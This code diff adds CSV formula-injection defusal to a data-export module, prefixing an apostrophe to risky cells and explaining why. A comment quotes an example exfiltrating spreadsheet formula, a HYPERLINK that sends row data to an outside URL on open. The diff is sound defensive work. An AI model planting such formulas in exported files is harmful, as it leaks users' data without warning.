@@ -8,6 +8,9 @@
 // which has no fetched_at by design (a failed run fetched nothing) and
 // carries started_at instead.
 //
+// The CSV defuses cells a spreadsheet would execute (see defuseFormula); the
+// JSON is verbatim, because nothing executes a JSON string.
+//
 // Pure functions of the Drizzle client, so test/terminal-export.test.ts can
 // drive them against the workerd D1 and read the bytes back.
 
@@ -297,17 +300,51 @@ export function parseExportPath(path: string): { name: string; format: ExportFor
 
 // ---- CSV -------------------------------------------------------------------
 
+/**
+ * Characters a spreadsheet reads as "this cell is a formula" when they lead.
+ * Tab and carriage return are here because Excel skips leading whitespace
+ * before deciding, so `\t=cmd` is a formula too.
+ */
+const FORMULA_LEAD = /^[=+@\t\r]/
+
+/** A cell that is just a number. `-3.5e4` leads with `-` and is not a formula. */
+const PLAIN_NUMBER = /^-?\d+(\.\d+)?([eE][+-]?\d+)?$/
+
+/**
+ * Defuse a cell a spreadsheet would execute.
+ *
+ * These exports are meant to be opened in Excel or Sheets — that is what
+ * `Content-Disposition: attachment` is for — and the strings in them are not
+ * ours: job titles, incident titles, vendor price notes and judge-written
+ * headlines all originate outside this Worker. A cell beginning `=`, `+`, `@`
+ * or `-` is a formula there, and `=HYPERLINK("https://…"&A1,"x")` exfiltrates
+ * the row on open, with no macro prompt and no warning.
+ *
+ * A leading apostrophe is the standard defusal: the spreadsheet treats the
+ * rest as literal text. It is visible in the cell, which is a real cost for a
+ * project that exports verbatim source data — so it is spent only where a
+ * value would otherwise be executed, and never on a plain number, which is
+ * the one case where a leading `-` is data rather than a fuse.
+ */
+export function defuseFormula(text: string): string {
+  if (FORMULA_LEAD.test(text)) return `'${text}`
+  if (text.startsWith('-') && !PLAIN_NUMBER.test(text)) return `'${text}`
+  return text
+}
+
 /** RFC 4180: quote when the value carries a comma, a quote, or a line break.
  * A list (an incident's components) is one JSON cell, not a comma-joined string
- * that a spreadsheet would split. */
+ * that a spreadsheet would split. Formula leads are defused first — see
+ * defuseFormula — so quoting never wraps a cell the reader would execute. */
 export function csvCell(value: unknown): string {
   if (value === null || value === undefined) return ''
-  const text =
+  const text = defuseFormula(
     typeof value === 'string'
       ? value
       : typeof value === 'object'
         ? JSON.stringify(value)
-        : String(value)
+        : String(value),
+  )
   return /[",\r\n]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text
 }
 
